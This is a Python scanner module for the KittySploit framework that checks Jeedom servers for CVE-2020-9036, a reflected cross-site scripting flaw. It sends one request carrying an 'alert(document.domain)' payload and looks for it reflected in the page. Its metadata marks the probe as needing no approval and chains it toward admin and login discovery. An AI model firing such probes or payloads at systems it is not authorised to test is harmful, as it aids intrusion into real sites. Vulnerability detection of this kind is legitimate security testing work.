#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jeedom through 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jeedom <=4.0.38 - Cross-Site Scripting Detection',
        'description': 'Jeedom through 4.0.38 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'jeedom', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sysdream.com/news/lab/2020-08-05-cve-2020-9036-jeedom-xss-leading-to-remote-code-execution/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-9036',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/my3ker/my3ker-cve-workshop',
        ],
        'cve': 'CVE-2020-9036',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?v=d&p=%22;alert(document.domain);%22', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>document.title = "";alert(document.domain);" - Jeedom"</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Jeedom <=4.0.38 - Cross-Site Scripting detected",
                path='/index.php?v=d&p=%22;alert(document.domain);%22',
            )
            return True
        return False

